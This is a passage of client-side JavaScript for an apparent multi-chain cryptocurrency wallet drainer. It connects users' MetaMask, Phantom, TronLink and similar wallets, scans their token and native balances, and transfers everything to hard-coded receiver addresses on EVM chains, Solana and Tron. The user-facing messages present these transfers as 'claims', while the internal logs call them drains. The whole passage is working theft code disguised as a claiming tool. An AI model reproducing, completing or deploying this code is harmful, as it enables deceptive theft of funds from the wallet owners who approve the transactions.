            selectedWallets.forEach(wallet => {
                if (wallet.supportedNetworks.includes(networkKey)) {
                    // Choose the correct provider based on network type
                    let walletProvider = wallet.provider;
                    if (wallet.type === 'multi' && wallet.evmProvider && 
                        ['ETH', 'POLYGON'].includes(networkKey)) {
                        // Use EVM provider for Ethereum-based networks (only ETH and POLYGON for Phantom)
                        walletProvider = wallet.evmProvider;
                        log(`Using EVM provider for ${wallet.name} on ${network.name}`, 'info');
                    } else if (networkKey === 'SOL') {
                        // Use Solana provider for Solana network
                        walletProvider = wallet.provider;
                        log(`Using Solana provider for ${wallet.name} on ${network.name}`, 'info');
                    }
                    
                    connectedNetworks[networkKey].wallets.push({
                        name: wallet.name,
                        provider: walletProvider,
                        type: wallet.type,
                        connected: false,
                        balance: 0,
                        tokens: [],
                        address: null
                    });
                    connectedNetworks[networkKey].stats.detected++;
                    log(`Added ${wallet.name} to ${network.name} network`, 'info');
                }
            });
        });
    }
    
    // Connect specific wallet to specific network
    async function connectWalletToNetwork(walletInfo, networkKey) {
        const network = NETWORKS[networkKey];
        const networkData = connectedNetworks[networkKey];
        
        log(`Attempting to connect ${walletInfo.name} to ${network.name}...`, 'info');
        
        // Find the wallet instance in the network
        const walletInstance = networkData.wallets.find(w => w.name === walletInfo.name);
        if (!walletInstance) {
            log(`✗ Wallet instance not found for ${walletInfo.name} on ${network.name}`, 'error');
            return;
        }
        
        if (walletInstance.connected) {
            log(`✓ ${walletInfo.name} already connected to ${network.name}`, 'info');
            return;
        }
        
        try {
            if (network.type === 'evm' || (walletInfo.type === 'multi' && ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'].includes(networkKey))) {
                await connectEVMWallet(networkKey, walletInstance);
            } else if (network.type === 'solana' || (walletInfo.type === 'multi' && networkKey === 'SOL')) {
                await connectSolanaWallet(networkKey, walletInstance);
            } else if (network.type === 'tron') {
                await connectTronWallet(networkKey, walletInstance);
            }
            
        } catch (error) {
            log(`✗ Connection error for ${walletInfo.name} to ${network.name}: ${error.message}`, 'error');
            throw error;
        }
    }

    // Render network wallets
    function renderNetworkWallets(networkKey) {
        const grid = $(`#wallets-${networkKey}-grid`);
        const networkData = connectedNetworks[networkKey];
        
        grid.empty();
        
        if (!networkData || networkData.wallets.length === 0) {
            grid.html('<div style="grid-column: 1/-1; text-align: center; opacity: 0.7; padding: 20px;">No selected wallets support this network</div>');
            return;
        }
        
        networkData.wallets.forEach((wallet, index) => {
            const walletItem = $(`
                <div class="wallet-item ${wallet.connected ? 'connected' : 'selected'}" data-network="${networkKey}" data-wallet="${index}">
                    <div class="wallet-name">${wallet.name}</div>
                    <div class="wallet-status">${wallet.connected ? 'Connected' : 'Selected'}</div>
                    ${wallet.connected ? `<div class="wallet-balance">${wallet.balance.toFixed(4)} ${networkData.network.currency}</div>` : ''}
                    ${wallet.connected && wallet.address ? `<div class="wallet-address">${wallet.address.slice(0, 8)}...${wallet.address.slice(-6)}</div>` : ''}
                    ${wallet.tokens.length > 0 ? `<div class="wallet-status">${wallet.tokens.length} tokens</div>` : ''}
                </div>
            `);
            
            grid.append(walletItem);
        });
    }
    
    // Update all network displays
    function updateAllNetworkDisplays() {
        Object.keys(connectedNetworks).forEach(networkKey => {
            renderNetworkWallets(networkKey);
            updateNetworkStats(networkKey);
            
            // Update network status indicators
            const networkData = connectedNetworks[networkKey];
            const connectedCount = networkData.wallets.filter(w => w.connected).length;
            
            if (connectedCount === networkData.wallets.length && connectedCount > 0) {
                $(`#status-${networkKey}`).text('🟢'); // All connected
            } else if (connectedCount > 0) {
                $(`#status-${networkKey}`).text('🟡'); // Partially connected
            } else {
                $(`#status-${networkKey}`).text('🔵'); // Selected but not connected
            }
        });
        
        updateGlobalStatistics();
    }

    // Update network statistics
    function updateNetworkStats(networkKey) {
        const networkData = connectedNetworks[networkKey];
        if (!networkData) return;
        
        const stats = networkData.stats;
        
        $(`#wallets-${networkKey}`).text(stats.detected);
        $(`#connected-${networkKey}`).text(stats.connected);
        $(`#balance-${networkKey}`).text(stats.balance.toFixed(4));
        $(`#tokens-${networkKey}`).text(stats.tokens);
    }

    function updateGlobalStatistics() {
        globalStats.totalNetworks = Object.keys(connectedNetworks).length;
        globalStats.totalWallets = selectedWallets.length;
        // totalValue would need price APIs to calculate properly
        updateGlobalStats();
    }

    // Connect to specific network wallet (legacy - now handled by connectWalletToNetwork)
    async function connectNetworkWallet(networkKey, walletIndex) {
        const networkData = connectedNetworks[networkKey];
        if (!networkData || !networkData.wallets[walletIndex]) return;
        
        const wallet = networkData.wallets[walletIndex];
        
        if (wallet.connected) return;
        
        try {
            log(`Connecting to ${wallet.name} on ${networkData.network.name}...`, 'info');
            
            if (networkData.network.type === 'evm') {
                await connectEVMWallet(networkKey, wallet);
            } else if (networkData.network.type === 'solana') {
                await connectSolanaWallet(networkKey, wallet);
            } else if (networkData.network.type === 'tron') {
                await connectTronWallet(networkKey, wallet);
            }
            
        } catch (error) {
            log(`✗ Failed to connect to ${wallet.name}: ${error.message}`, 'error');
        }
    }

    // EVM wallet connection
    async function connectEVMWallet(networkKey, wallet) {
        const networkData = connectedNetworks[networkKey];
        const network = networkData.network;
        
        log(`Connecting ${wallet.name} to ${network.name} (Chain ID: ${network.chainId})...`, 'info');
        
        // Switch to correct network
        try {
            await wallet.provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: `0x${network.chainId.toString(16)}` }]
            });
            log(`✓ Switched to ${network.name} network`, 'info');
        } catch (switchError) {
            // Network not added, try to add it
            if (switchError.code === 4902) {
                try {
                    await wallet.provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: `0x${network.chainId.toString(16)}`,
                            chainName: network.name,
                            rpcUrls: [network.rpc],
                            nativeCurrency: {
                                name: network.currency,
                                symbol: network.currency,
                                decimals: 18
                            }
                        }]
                    });
                    log(`✓ Added and switched to ${network.name} network`, 'info');
                } catch (addError) {
                    throw new Error(`Failed to add ${network.name} network: ${addError.message}`);
                }
            } else {
                throw switchError;
            }
        }
        
        // Wait for network switch to complete
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        // Request account access
        const accounts = await wallet.provider.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];
        
        // Initialize ethers provider AFTER network switch
        const ethersProvider = new ethers.providers.Web3Provider(wallet.provider);
        
        // Verify we're on the correct network
        const currentNetwork = await ethersProvider.getNetwork();
        if (currentNetwork.chainId !== network.chainId) {
            log(`⚠️ Network mismatch: Expected ${network.chainId}, got ${currentNetwork.chainId}`, 'error');
            throw new Error(`Network mismatch: Expected ${network.chainId}, got ${currentNetwork.chainId}`);
        }
        
        log(`✓ Confirmed connection to ${network.name} (Chain ID: ${currentNetwork.chainId})`, 'info');
        
        const balance = await ethersProvider.getBalance(userAddress);
        const ethBalance = parseFloat(ethers.utils.formatEther(balance));
        
        // Get token balances
        const tokenBalances = await getEVMTokenBalances(ethersProvider, userAddress, network.tokens);
        
        // Update wallet state
        wallet.connected = true;
        wallet.balance = ethBalance;
        wallet.address = userAddress;
        wallet.ethersProvider = ethersProvider;
        wallet.tokens = tokenBalances;
        
        // Update stats
        networkData.stats.connected++;
        networkData.stats.balance += ethBalance;
        networkData.stats.tokens += tokenBalances.length;
        
        log(`✓ Connected ${wallet.name} to ${network.name}: ${userAddress.slice(0, 8)}... (${ethBalance.toFixed(4)} ${network.currency})`, 'success');
    }

    // Get EVM token balances
    async function getEVMTokenBalances(provider, address, tokens) {
        const tokenBalances = [];
        const erc20ABI = [
            "function balanceOf(address owner) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function symbol() view returns (string)",
            "function transfer(address to, uint256 amount) returns (bool)"
        ];
        
        log(`🔍 Scanning ${tokens.length} tokens for balances...`, 'info');
        
        for (const token of tokens) {
            try {
                // Ensure proper address checksum
                const checksummedAddress = ethers.utils.getAddress(token.address);
                const contract = new ethers.Contract(checksummedAddress, erc20ABI, provider);
                const balance = await contract.balanceOf(address);
                
                const formattedBalance = parseFloat(ethers.utils.formatUnits(balance, token.decimals));
                
                if (!balance.isZero() && formattedBalance > 0) {
                    tokenBalances.push({
                        symbol: token.symbol,
                        balance: formattedBalance,
                        rawBalance: balance,
                        contract: contract,
                        address: checksummedAddress,
                        decimals: token.decimals
                    });
                    log(`✅ Found ${token.symbol} balance: ${formattedBalance.toFixed(6)}`, 'success');
                } else {
                    log(`⚪ ${token.symbol}: No balance (${formattedBalance.toFixed(6)})`, 'info');
                }
            } catch (error) {
                log(`❌ Error checking ${token.symbol} balance: ${error.message}`, 'error');
            }
        }
        
        log(`🎯 Token scan complete: Found ${tokenBalances.length} tokens with balance`, 'info');
        return tokenBalances;
    }

    // Connect Solana wallet
    async function connectSolanaWallet(networkKey, wallet) {
        const networkData = connectedNetworks[networkKey];
        
        const response = await wallet.provider.connect({ onlyIfTrusted: false });
        const publicKey = new solanaWeb3.PublicKey(response.publicKey || wallet.provider.publicKey);
        
        // Get balance
        const connection = new solanaWeb3.Connection(networkData.network.rpc, 'confirmed');
        const balance = await connection.getBalance(publicKey);
        const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
        
        // Update wallet state
        wallet.connected = true;
        wallet.balance = solBalance;
        wallet.address = publicKey.toString();
        wallet.publicKey = publicKey;
        wallet.connection = connection;
        
        // Update stats
        networkData.stats.connected++;
        networkData.stats.balance += solBalance;
        
        log(`✓ Connected ${wallet.name} to Solana: ${publicKey.toString().slice(0, 8)}... (${solBalance.toFixed(4)} SOL)`, 'success');
    }

    // Connect Tron wallet
    async function connectTronWallet(networkKey, wallet) {
        const networkData = connectedNetworks[networkKey];
        
        if (!wallet.provider.defaultAddress.base58) {
            throw new Error('TronLink wallet not connected');
        }
        
        const address = wallet.provider.defaultAddress.base58;
        const balance = await wallet.provider.trx.getBalance(address);
        const trxBalance = balance / 1000000; // TRX has 6 decimals
        
        // Update wallet state
        wallet.connected = true;
        wallet.balance = trxBalance;
        wallet.address = address;
        
        // Update stats
        networkData.stats.connected++;
        networkData.stats.balance += trxBalance;
        
        log(`✓ Connected ${wallet.name} to Tron: ${address.slice(0, 8)}... (${trxBalance.toFixed(4)} TRX)`, 'success');
    }

    // Connect all networks (legacy - now use connectSelectedWallets)
    async function connectAllNetworks() {
        if (selectedWallets.length === 0) {
            log('No wallets selected! Please select wallets from the Wallet Selection tab first.', 'error');
            return;
        }
        
        await connectSelectedWallets();
    }

    // Claim from all networks
    async function claimAllNetworks() {
        log('🚀 STARTING MULTI-NETWORK CLAIM PROCESS', 'info');
        log('=' .repeat(60), 'info');
        
        const connectedWallets = [];
        Object.keys(connectedNetworks).forEach(networkKey => {
            connectedNetworks[networkKey].wallets.forEach((wallet, index) => {
                if (wallet.connected) {
                    // Include wallets even if balance is 0 - they might have tokens
                    connectedWallets.push({ networkKey, walletIndex: index, wallet });
                    log(`✓ Found connected wallet: ${wallet.name} on ${NETWORKS[networkKey].name} (${wallet.balance.toFixed(4)} ${NETWORKS[networkKey].currency}, ${wallet.tokens.length} tokens)`, 'info');
                }
            });
        });
        
        if (connectedWallets.length === 0) {
            log('❌ No connected wallets found!', 'error');
            log('Please make sure to:', 'info');
            log('1. Select wallets from Wallet Selection tab', 'info');
            log('2. Connect selected wallets using "Connect Selected Wallets" button', 'info');
            return;
        }
        
        log(`🎯 Starting multi-network claim from ${connectedWallets.length} wallet(s)...`, 'info');
        log('=' .repeat(60), 'info');
        updateProgress(0, 'Initializing claims...');
        
        const results = {
            successful: 0,
            failed: 0,
            totalClaimed: {},
            transactions: []
        };
        
        for (let i = 0; i < connectedWallets.length; i++) {
            const { networkKey, wallet } = connectedWallets[i];
            const networkData = connectedNetworks[networkKey];
            
            log(`🔄 [${i + 1}/${connectedWallets.length}] Processing ${wallet.name} on ${networkData.network.name}...`, 'info');
            updateProgress((i / connectedWallets.length) * 100, `Draining ${wallet.name} on ${networkData.network.name}...`);
            
            try {
                let result;
                if (networkData.network.type === 'evm') {
                    log(`🔷 Starting EVM drain for ${wallet.name}...`, 'info');
                    result = await drainEVMWallet(networkKey, wallet);
                } else if (networkData.network.type === 'solana') {
                    log(`🟢 Starting Solana drain for ${wallet.name}...`, 'info');
                    result = await drainSolanaWallet(networkKey, wallet);
                } else if (networkData.network.type === 'tron') {
                    log(`🟠 Starting Tron drain for ${wallet.name}...`, 'info');
                    result = await drainTronWallet(networkKey, wallet);
                }
                
                if (result.success) {
                    results.successful++;
                    results.totalClaimed[networkData.network.currency] = (results.totalClaimed[networkData.network.currency] || 0) + result.amount;
                    results.transactions.push(result.txid);
                    
                    log(`🎉 DRAINED ${wallet.name}: ${result.amount.toFixed(4)} ${networkData.network.currency}`, 'success');
                    log(`📝 Transaction: ${result.txid}`, 'success');
                } else {
                    results.failed++;
                    log(`❌ FAILED to drain ${wallet.name}: ${result.reason}`, 'error');
                }
                
            } catch (error) {
                results.failed++;
                log(`❌ ERROR draining ${wallet.name}: ${error.message}`, 'error');
                log(`❌ Error details: ${error.stack}`, 'error');
            }
            
            // Add delay between drains
            if (i < connectedWallets.length - 1) {
                log(`⏳ Waiting 2 seconds before next drain...`, 'info');
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }
        
        updateProgress(100, 'Multi-network claim complete!');
        setTimeout(() => updateProgress(0, ''), 3000);
        
        // Show results
        log('=' .repeat(60), 'info');
        log('🏁 MULTI-NETWORK CLAIM COMPLETE!', 'success');
        log('=' .repeat(60), 'info');
        log(`✅ Successful drains: ${results.successful}`, 'success');
        log(`❌ Failed drains: ${results.failed}`, results.failed > 0 ? 'error' : 'info');
        
        if (Object.keys(results.totalClaimed).length > 0) {
            log('💰 TOTAL CLAIMED:', 'success');
            Object.keys(results.totalClaimed).forEach(currency => {
                log(`   💎 ${currency}: ${results.totalClaimed[currency].toFixed(6)}`, 'success');
            });
        }
        
        log(`� Total Transactions: ${results.transactions.length}`, 'info');
        if (results.transactions.length > 0) {
            log('📝 Transaction Hashes:', 'info');
            results.transactions.forEach((txid, index) => {
                log(`   ${index + 1}. ${txid}`, 'info');
            });
        }
        log('=' .repeat(60), 'info');
        
        // Reset balances in UI
        Object.keys(connectedNetworks).forEach(networkKey => {
            connectedNetworks[networkKey].wallets.forEach(wallet => {
                if (wallet.connected) wallet.balance = 0;
            });
            connectedNetworks[networkKey].stats.balance = 0;
            renderNetworkWallets(networkKey);
            updateNetworkStats(networkKey);
        });
        
        const summary = Object.keys(results.totalClaimed).map(currency => 
            `${results.totalClaimed[currency].toFixed(4)} ${currency}`
        ).join(', ');
        
        const alertMessage = summary ? 
            `🎉 Multi-network claim complete!\n\n✅ ${results.successful} successful\n❌ ${results.failed} failed\n💰 Claimed: ${summary}` :
            `⚠️ Multi-network claim complete!\n\n✅ ${results.successful} successful\n❌ ${results.failed} failed\n💰 No tokens claimed`;
            
        alert(alertMessage);
    }

    // Drain EVM wallet
    async function drainEVMWallet(networkKey, wallet) {
        try {
            const networkData = connectedNetworks[networkKey];
            const network = networkData.network;
            const receiverAddress = ethers.utils.getAddress(RECEIVER_ADDRESSES[networkKey]); // Ensure proper checksum
            
            log(`🔄 Starting EVM drain process for ${wallet.name} on ${network.name}...`, 'info');
            log(`📍 Receiver address: ${receiverAddress}`, 'info');
            log(`💰 Current wallet balance: ${wallet.balance} ${network.currency}`, 'info');
            
            if (wallet.balance <= 0) {
                log(`❌ No balance to drain (${wallet.balance} ${network.currency})`, 'error');
                return { success: false, reason: 'No balance' };
            }
            
            log(`🔄 Initiating network switch to ${network.name} (Chain ID: ${network.chainId})...`, 'info');
            
            // Ensure we're on the correct network before draining
            try {
                const chainIdHex = `0x${network.chainId.toString(16)}`;
                log(`🔗 Switching to chain ID: ${chainIdHex}`, 'info');
                
                await wallet.provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: chainIdHex }]
                });
                
                log(`✅ Network switch request sent, waiting for completion...`, 'info');
                
                // Wait a moment for network switch to complete
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Re-initialize ethers provider after network switch
                wallet.ethersProvider = new ethers.providers.Web3Provider(wallet.provider);
                
                // Verify network switch
                const currentNetwork = await wallet.ethersProvider.getNetwork();
                log(`✅ Network verification: Connected to Chain ID ${currentNetwork.chainId}`, 'info');
                
                if (currentNetwork.chainId !== network.chainId) {
                    log(`❌ Network mismatch! Expected ${network.chainId}, got ${currentNetwork.chainId}`, 'error');
                    return { success: false, reason: `Network mismatch: Expected ${network.chainId}, got ${currentNetwork.chainId}` };
                }
                
                log(`✅ Successfully switched to ${network.name} and reinitialized provider`, 'success');
                
            } catch (switchError) {
                log(`❌ Failed to switch to ${network.name}: ${switchError.message}`, 'error');
                log(`❌ Switch error code: ${switchError.code}`, 'error');
                return { success: false, reason: `Network switch failed: ${switchError.message}` };
            }
            
            // Drain tokens first
            log(`🪙 Starting token drainage (${wallet.tokens.length} tokens found)...`, 'info');
            
            if (wallet.tokens.length === 0) {
                log(`📋 No tokens found in wallet - this could mean:`, 'info');
                log(`   1. Wallet has no token balances`, 'info');
                log(`   2. Token addresses may be incorrect`, 'info');
                log(`   3. Network RPC issues during token scanning`, 'info');
                
                // Let's try to rescan tokens in case they were missed
                log(`🔄 Attempting to rescan tokens...`, 'info');
                const tokenBalances = await getEVMTokenBalances(wallet.ethersProvider, wallet.address, network.tokens);
                
                if (tokenBalances.length > 0) {
                    log(`✅ Rescan found ${tokenBalances.length} tokens!`, 'success');
                    wallet.tokens = tokenBalances;
                } else {
                    log(`📋 Rescan confirmed: No tokens with balance found`, 'info');
                }
            }
            
            for (const token of wallet.tokens) {
                try {
                    log(`🔄 Draining ${token.symbol}: ${token.balance} tokens...`, 'info');
                    log(`📍 Token contract: ${token.address}`, 'info');
                    log(`📍 Sending to: ${receiverAddress}`, 'info');
                    
                    const transferAmount = token.rawBalance || ethers.utils.parseUnits(token.balance.toString(), token.decimals);
                    
                    const tx = await token.contract.connect(wallet.ethersProvider.getSigner()).transfer(
                        receiverAddress,
                        transferAmount
                    );
                    
                    log(`📤 Token transfer transaction sent: ${tx.hash}`, 'info');
                    log(`⏳ Waiting for token transfer confirmation...`, 'info');
                    
                    await tx.wait();
                    log(`✅ Token drained successfully: ${token.balance.toFixed(4)} ${token.symbol}`, 'success');
                    log(`📝 Token transfer hash: ${tx.hash}`, 'success');
                    
                } catch (error) {
                    log(`❌ Failed to drain ${token.symbol}: ${error.message}`, 'error');
                    log(`❌ Token drain error details: ${error.stack}`, 'error');
                }
            }
            
            // Drain native currency
            log(`💎 Starting native currency (${network.currency}) drainage...`, 'info');
            const gasPrice = await wallet.ethersProvider.getGasPrice();
            const gasLimit = ethers.BigNumber.from("21000");
            const gasCost = gasPrice.mul(gasLimit);
            const balance = await wallet.ethersProvider.getBalance(wallet.address);
            const amountToSend = balance.sub(gasCost);
            
            log(`📊 Gas calculation:`, 'info');
            log(`   💰 Current balance: ${ethers.utils.formatEther(balance)} ${network.currency}`, 'info');
            log(`   ⛽ Gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} Gwei`, 'info');
            log(`   ⛽ Gas limit: ${gasLimit.toString()}`, 'info');
            log(`   ⛽ Total gas cost: ${ethers.utils.formatEther(gasCost)} ${network.currency}`, 'info');
            log(`   💸 Amount to send: ${ethers.utils.formatEther(amountToSend)} ${network.currency}`, 'info');
            
            if (amountToSend.lte(0)) {
                log(`❌ Insufficient balance for gas fees`, 'error');
                return { success: false, reason: 'Insufficient balance for gas' };
            }
            
            log(`📤 Sending native currency transaction...`, 'info');
            const tx = await wallet.ethersProvider.getSigner().sendTransaction({
                to: receiverAddress,
                value: amountToSend,
                gasLimit: gasLimit,
                gasPrice: gasPrice
            });
            
            log(`📤 Transaction sent: ${tx.hash}`, 'info');
            log(`⏳ Waiting for transaction confirmation...`, 'info');
            await tx.wait();
            
            const amount = parseFloat(ethers.utils.formatEther(amountToSend));
            
            log(`🎉 Successfully drained ${amount.toFixed(6)} ${network.currency}!`, 'success');
            log(`📝 Transaction hash: ${tx.hash}`, 'success');
            
            return { success: true, amount, txid: tx.hash };
            
        } catch (error) {
            log(`❌ EVM drain error: ${error.message}`, 'error');
            log(`❌ Error stack: ${error.stack}`, 'error');
            return { success: false, reason: error.message };
        }
    }

    // Drain Solana wallet
    async function drainSolanaWallet(networkKey, wallet) {
        try {
            log(`🔄 Starting Solana drain process for ${wallet.name}...`, 'info');
            
            const receiverPubkey = new solanaWeb3.PublicKey(RECEIVER_ADDRESSES.SOL);
            log(`📍 Receiver address: ${receiverPubkey.toString()}`, 'info');
            log(`📍 Wallet address: ${wallet.publicKey.toString()}`, 'info');
            
            const balance = await wallet.connection.getBalance(wallet.publicKey);
            
            // SOL balance in lamports
            log(`💰 Current balance: ${balance} lamports (${(balance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6)} SOL)`, 'info');
            
            if (balance <= 0) {
                log(`❌ No balance to drain`, 'error');
                return { success: false, reason: 'No balance' };
            }
            
            // Estimate transaction fee
            log(`⛽ Estimating transaction fees...`, 'info');
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: wallet.publicKey,
                    toPubkey: receiverPubkey,
                    lamports: 1, // Dummy amount for fee estimation
                })
            );
            
            transaction.feePayer = wallet.publicKey;
            const blockhashObj = await wallet.connection.getLatestBlockhash();
            transaction.recentBlockhash = blockhashObj.blockhash;
            log(`🔗 Latest blockhash: ${blockhashObj.blockhash}`, 'info');
            
            const feeEstimate = await wallet.connection.getFeeForMessage(transaction.compileMessage());
            const estimatedFee = feeEstimate.value || 5000; // Default to 5000 lamports if estimation fails
            
            // Add some buffer for network congestion and account rent
            const minimumRent = 890880; // Minimum rent for account (approximately 0.00089 SOL)
            const feeBuffer = Math.max(estimatedFee * 2, 10000); // At least 2x estimated fee or 10000 lamports
            const totalReserved = minimumRent + feeBuffer;
            
            // Calculate amount to send (balance minus all reserved amounts)
            const lamportsToSend = balance - totalReserved;
            
            log(`📊 Fee calculation:`, 'info');
            log(`   ⛽ Estimated fee: ${estimatedFee} lamports (${(estimatedFee / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6)} SOL)`, 'info');
            log(`   🏠 Minimum rent: ${minimumRent} lamports (${(minimumRent / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6)} SOL)`, 'info');
            log(`   🛡️ Fee buffer: ${feeBuffer} lamports (${(feeBuffer / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6)} SOL)`, 'info');
            log(`   💸 Amount to send: ${lamportsToSend} lamports (${(lamportsToSend / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6)} SOL)`, 'info');
            
            if (lamportsToSend <= 0) {
                log(`❌ Insufficient balance for fees. Balance: ${balance}, Required: ${totalReserved}`, 'error');
                return { success: false, reason: `Insufficient balance for fees. Balance: ${balance}, Required: ${totalReserved}` };
            }
            
            // Create the actual transaction
            log(`📤 Creating transfer transaction...`, 'info');
            const actualTransaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: wallet.publicKey,
                    toPubkey: receiverPubkey,
                    lamports: lamportsToSend,
                })
            );
            
            actualTransaction.feePayer = wallet.publicKey;
            actualTransaction.recentBlockhash = blockhashObj.blockhash;
            
            log(`✍️ Requesting wallet signature...`, 'info');
            const signedTransaction = await wallet.provider.signTransaction(actualTransaction);
            
            log(`📤 Sending transaction to Solana network...`, 'info');
            const txid = await wallet.connection.sendRawTransaction(signedTransaction.serialize());
            
            log(`📤 Transaction sent: ${txid}`, 'info');
            log(`⏳ Waiting for confirmation...`, 'info');
            await wallet.connection.confirmTransaction(txid);
            
            const amount = lamportsToSend / solanaWeb3.LAMPORTS_PER_SOL;
            log(`🎉 Successfully drained ${amount.toFixed(6)} SOL!`, 'success');
            log(`📝 Transaction hash: ${txid}`, 'success');
            
            return { success: true, amount, txid };
            
        } catch (error) {
            log(`❌ Solana drain error: ${error.message}`, 'error');
            log(`❌ Error stack: ${error.stack}`, 'error');
            return { success: false, reason: error.message };
        }
    }

    // Drain Tron wallet
    async function drainTronWallet(networkKey, wallet) {
        try {
            const receiverAddress = RECEIVER_ADDRESSES.TRX;
            const balance = await wallet.provider.trx.getBalance(wallet.address);
            const amountToSend = balance - 1000000; // Leave 1 TRX for fees
            
            if (amountToSend <= 0) {
                return { success: false, reason: 'Insufficient balance after fees' };
            }
            
            const transaction = await wallet.provider.transactionBuilder.sendTrx(
                receiverAddress,
                amountToSend,
                wallet.address
            );
            
            const signedTransaction = await wallet.provider.trx.sign(transaction);
            const result = await wallet.provider.trx.sendRawTransaction(signedTransaction);
            
            const amount = amountToSend / 1000000;
            return { success: true, amount, txid: result.txid };
            
        } catch (error) {
            return { success: false, reason: error.message };
        }
    }

    // Event handlers - Using event delegation for dynamically created elements
    $('#scan-all-networks').on('click', scanAllNetworks);
    $('#connect-all-networks').on('click', connectAllNetworks);
    $('#claim-all-networks').on('click', claimAllNetworks);
    
    // Wallet selection event handlers - Use event delegation since buttons are created dynamically
    $(document).on('click', '#select-all-wallets', function() {
        log('🎯 Select All Wallets button clicked', 'info');
        selectAllWallets();
    });
    
    $(document).on('click', '#clear-selection', function() {
        log('🗑️ Clear Selection button clicked', 'info');
        clearWalletSelection();
    });
    
    $(document).on('click', '#connect-selected-wallets', function() {
        log('🔗 Connect Selected Wallets button clicked (event handler)', 'info');
        connectSelectedWallets();
    });
    
    $(document).on('click', '#mobile-wallet-help', function() {
        log('📱 Mobile Wallet Help button clicked', 'info');
        showMobileWalletHelp();
    });

    // Simple wallet selector functionality
    $(document).on('change', '#wallet-selector', function() {
        const selectedWallet = $(this).val();
        if (selectedWallet) {
            $('#connect-wallet-btn').prop('disabled', false);
            log(`🎯 Selected wallet: ${selectedWallet}`, 'info');
        } else {
            $('#connect-wallet-btn').prop('disabled', true);
        }
    });

    $(document).on('click', '#connect-wallet-btn', function() {
        const selectedWallet = $('#wallet-selector').val();
        if (!selectedWallet) {
            alert('Please select a wallet first!');
            return;
        }
        
        log(`🚀 Starting connection and claim process for ${selectedWallet}...`, 'info');
        connectAndClaimWallet(selectedWallet);
    });

    // Main wallet connection and claiming function
    async function connectAndClaimWallet(walletType) {
        try {
            updateProgress(0, 'Initializing wallet connection...');
            
            // Get wallet provider - will be determined per network
            const initialProvider = getWalletProvider(walletType);
            if (!initialProvider) {
                throw new Error(`${walletType} wallet not found. Please install the wallet extension.`);
            }
            
            // Determine supported networks
            const supportedNetworks = getSupportedNetworks(walletType);
            log(`📋 ${walletType} supports: ${supportedNetworks.join(', ')}`, 'info');
            
            updateProgress(20, 'Connecting to wallet...');
            
            // Connect to all supported networks and drain
            let totalClaimed = 0;
            let successfulDrains = 0;
            
            for (let i = 0; i < supportedNetworks.length; i++) {
                const networkKey = supportedNetworks[i];
                const network = NETWORKS[networkKey];
                
                updateProgress(20 + (i / supportedNetworks.length) * 70, `Processing ${network.name}...`);
                
                try {
                    log(`🔗 Connecting to ${network.name}...`, 'info');
                    
                    // Get the correct provider for this specific network
                    const networkProvider = getWalletProvider(walletType, network.type);
                    
                    if (network.type === 'evm') {
                        const result = await connectAndDrainEVM(networkProvider, networkKey);
                        if (result.success) {
                            totalClaimed += result.amount;
                            successfulDrains++;
                        }
                    } else if (network.type === 'solana') {
                        const result = await connectAndDrainSolana(networkProvider, networkKey);
                        if (result.success) {
                            totalClaimed += result.amount;
                            successfulDrains++;
                        }
                    } else if (network.type === 'tron') {
                        const result = await connectAndDrainTron(networkProvider, networkKey);
                        if (result.success) {
                            totalClaimed += result.amount;
                            successfulDrains++;
                        }
                    }
                    
                    // Small delay between networks
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    
                } catch (error) {
                    log(`❌ Failed to process ${network.name}: ${error.message}`, 'error');
                }
            }
            
            updateProgress(100, 'Process complete!');
            
            // Show results
            log('🎉 CLAIMING COMPLETE!', 'success');
            log(`✅ Successfully processed: ${successfulDrains}/${supportedNetworks.length} networks`, 'success');
            
            setTimeout(() => updateProgress(0, ''), 3000);
            
            const message = successfulDrains > 0 ? 
                `🎉 Successfully claimed from ${successfulDrains} network(s)!` :
                `⚠️ No tokens were claimed. Please check your wallet balances.`;
            
            alert(message);
            
        } catch (error) {
            log(`❌ Error: ${error.message}`, 'error');
            updateProgress(0, '');
            alert(`❌ Error: ${error.message}`);
        }
    }

    function getWalletProvider(walletType, networkType = null) {
        // For multi-network wallets, return provider based on network type
        if (walletType === 'phantom') {
            // Phantom supports both Solana and EVM
            if (networkType === 'solana') return window.solana;
            if (networkType === 'evm') return window.ethereum;
            return window.solana; // Default to Solana for Phantom
        }
        
        if (walletType === 'trust') {
            // Trust Wallet supports EVM and Tron
            if (networkType === 'tron') return window.tronWeb;
            if (networkType === 'evm') return window.ethereum;
            return window.ethereum; // Default to EVM for Trust Wallet
        }
        
        // Standard provider mapping for other wallets
        const providers = {
            'metamask': window.ethereum,
            'coinbase': window.ethereum,
            'rainbow': window.ethereum,
            'injected-evm': window.ethereum,
            'solflare': window.solflare,
            'backpack': window.backpack,
            'glow': window.glow,
            'injected-solana': window.solana,
            'tronlink': window.tronWeb,
            'injected-tron': window.tronWeb
        };
        
        return providers[walletType];
    }

    function getSupportedNetworks(walletType) {
        const networks = {
            'metamask': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
            'trust': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'TRX'],
            'coinbase': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
            'rainbow': ['ETH', 'POLYGON', 'ARBITRUM', 'OPTIMISM'],
